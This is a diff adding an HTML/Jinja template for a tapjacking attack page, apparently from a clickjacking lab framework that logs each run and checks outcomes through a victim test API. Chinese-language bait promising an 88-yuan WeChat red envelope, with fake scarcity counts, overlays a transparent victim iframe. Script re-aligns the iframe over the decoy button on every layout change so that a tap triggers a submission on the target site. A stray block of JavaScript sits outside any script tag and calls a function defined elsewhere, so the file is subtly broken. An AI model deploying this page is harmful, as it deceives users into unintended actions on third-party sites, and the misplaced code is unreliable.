@@ -1,0 +1,84 @@
+{% extends "attacker/base.html" %}
+
+// 布局稳定前按钮位置可能变化（字体渲染/内容加载/滚动条出现），
+// 在所有布局变化点重复对齐，幂等且开销极低。
+window.addEventListener("load", alignFrame);
+window.addEventListener("scroll", alignFrame, { passive: true });
+if (document.fonts && document.fonts.ready) {
+  document.fonts.ready.then(function () { alignFrame(); });
+}
+[300, 800, 1500].forEach(function (ms) { setTimeout(alignFrame, ms); });
+{% block title %}{{ scenario.seq }} {{ scenario.title }}{% endblock %}
+{% block content %}
+{% include "attacker/run/_run_header.html" %}
+
+<div class="phone-stage">
+  <div class="phone-bezel">
+    <div class="phone-notch"></div>
+    <div class="phone-screen" id="stage">
+      <div class="decoy-card tap-card">
+        <span class="decoy-badge">🧧 新人专享</span>
+        <h2>下载即领 88 元红包</h2>
+        <div class="decoy-prize">🧧</div>
+        <p>仅剩 <b>37</b> 份 · 已有 2,841 人领取</p>
+        <button type="button" class="decoy-button tap-button" id="decoy-button">{{ params.decoy_text }}</button>
+        <p class="tap-hint">点击按钮立即到账微信零钱</p>
+      </div>
+      {% set effective_opacity = 0.35 if (params.debug and params.opacity < 0.35) else params.opacity %}
+      <iframe id="victim-frame"
+              class="{{ 'debug-outline' if params.debug else '' }}"
+              title="attack target"
+              src="{{ params.victim_url() }}"
+              style="width: {{ params.iframe_width }}px; height: {{ params.iframe_height }}px; opacity: {{ effective_opacity }};"></iframe>
+    </div>
+  </div>
+</div>
+
+<script>
+  const RUN_ID = {{ run.run_id | tojson }};
+  const REPORT_TOKEN = {{ report_token | tojson }};
+  const PARAMS = {{ params.as_dict() | tojson }};
+</script>
+<script src="{{ url_for('static', filename='js/attack-report.js') }}"></script>
+<script>
+  (function () {
+    "use strict";
+    const stage = document.getElementById("stage");
+    const frame = document.getElementById("victim-frame");
+    const decoy = document.getElementById("decoy-button");
+    const statusLine = document.getElementById("run-status");
+
+    function alignFrame() {
+      const stageRect = stage.getBoundingClientRect();
+      const decoyRect = decoy.getBoundingClientRect();
+      const cx = decoyRect.left + decoyRect.width / 2 - stageRect.left;
+      const cy = decoyRect.top + decoyRect.height / 2 - stageRect.top;
+      frame.style.left = Math.round(cx - PARAMS.iframe_width / 2) + "px";
+      frame.style.top = Math.round(cy - PARAMS.iframe_height / 2) + "px";
+    }
+
+    let loadsForCurrentSrc = 0;
+    let finished = false;
+
+    frame.addEventListener("load", function () {
+      loadsForCurrentSrc += 1;
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, {
+        type: "iframe_load", sequence: loadsForCurrentSrc
+      });
+      if (loadsForCurrentSrc >= 2 && !finished) {
+        finished = true;
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "victim_action_reload", sequence: loadsForCurrentSrc });
+        AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "run_complete", outcome: "likely_success" });
+        statusLine.textContent = "触摸点击已触发目标提交，请用 victim 测试 API 核实业务状态变化。";
+      }
+    });
+
+    window.addEventListener("DOMContentLoaded", function () {
+      alignFrame();
+      AttackReport.reportEvent(RUN_ID, REPORT_TOKEN, { type: "page_ready", scenario: "tapjacking" });
+      statusLine.textContent = "移动端诱导页就绪：大号触摸按钮更易误触，透明 iframe 已对齐。";
+    });
+    window.addEventListener("resize", alignFrame);
+  })();
+</script>
+{% endblock %}
